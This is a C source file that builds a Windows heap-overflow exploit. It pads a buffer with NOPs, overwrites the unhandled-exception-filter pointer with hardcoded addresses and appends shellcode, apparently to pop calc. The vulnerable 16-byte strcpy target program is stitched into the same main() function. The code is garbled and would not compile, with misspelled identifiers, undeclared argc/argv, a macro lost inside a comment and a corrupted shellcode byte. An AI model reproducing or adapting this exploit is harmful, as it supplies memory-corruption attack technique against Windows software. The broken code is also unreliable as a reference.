#include<windows.h>
#include<stdio.h>
#include<conio.h>

//path to application with flow
#define BAD_APP "Heap_Overflow.exe"
//path to unhandled exception filer#define UEF_PTR_ADDR 0x77ED73B4
//path to instruction dword ptr[edi+0x74] 
//edi has EXCEPTION_POINTER struction
//0x74 behind this addres is the buffor's end address on the heap
#define NETAPI_ADDR 0x77C3BBAD
//shellcode in hesydecimal form
#define Heap_Size 16

unsigned char shellcode[]
{
	0x6A,0x05,0xC7,0x04,0x24,0x63,0x61,0x6C,0x63,0x33,0xC9,
	0x89,0x4C,0x24,0x04,0x54,0x68,0xFD,0x98,0xE7,0x77,0xB8,
	0,35,0xFD,0xE6,0x77,0xFF,0xE0
};

int main(void)
{
	int i;
	
	STARTUPINFO si;
	
	PROCESS_INFORMATION pi;
	
	char exploit_data[1024];
	
	//set variables
	memset(&si,0,sizeof(STARUPINFO));
	memset(&pi,0,sizeof(PROCESS_INFORMATION));
	memset((void*)exploit_data,0,sizeof(exploit_data));
	
	//prepares of entrance chain
	i=strlen(BAD_APP);
	memcpy((void*)&exploit_data,BAD_APP,i);
	
	//overwrite the buffor
	memset((void*)&exploit_data[i],0x90,16+8);
	i+=16+8;
	
	//forehead jump
	*(WORD*)&exploit_data[i-2]=0x08EB;
	*(DWORD*)&exploit_data[i]=NETAPPI_ADDR;
	*(DWORD*)&exploit_data[i+4]=UEF_PTR_ADDR;
	i+=8;
	
	//add shellcode
	memcpy((void*)&exploit_data[i],(void*)&shellcode,sizeof(shellcode));
	i+=sizeof(shellcode);
	
	exploit_data[i]='"';
	
	if(CreateProcess(NULL,(char*)&exploit_data,NULL,NULL,False,0,NULL,NULL,&si,&pi)==NULL)
	{
		printf("ERROR proccess can not be launch");
		getch();
		return -1;
	}
	
	WaitForSingleObject(pi.hProcess,INIFINITE);
	
	CloseHandle(pi.hProcess);
	Closehandle(pi.hThread);
	
//second one
	void *mem;
  HANDLE h=NULL;
  DWORD oldp;
  
  LoadLibrary("netapi32.dll");
  LoadLibrary("user32.dll");
  
  if(argc<2)
  {
  	printf("ERROR  too less arguments");
  	return -1;
  }
  
  //create heap with default size (4kB) and the last parametr says heap can grows (the heap has no size limit) 
  h=HeapCreate(0,0,0);
  
  //alloc memory on heap (first parametr) and give my application 16 bajts ( defines by Heap_Size value)
  mem=HeapAlloc(h,NULL,Heap_Size);
  
  
  printf("Heap: %0x\n",h);
  printf("block of heap: %08x\n",mem);
  printf("chain copying:%s",argv[1]);
  
  
  //copy chain from user to mem value 
  //it's achilles heel of application beceause i allocted only 16 baits of memory 
  //if user put more then 16 baits, heap will get overflow
  //both mov dword ptr[ecx],eax and mov doword ptr [eax+4],ecx refer to non-existing place 
  //in memory so we get a critical memory 
  strcpy((char*)mem,argv[1]);
  
  HeapAlloc(h,NULL,Heap_Size);
  
  return 0;
}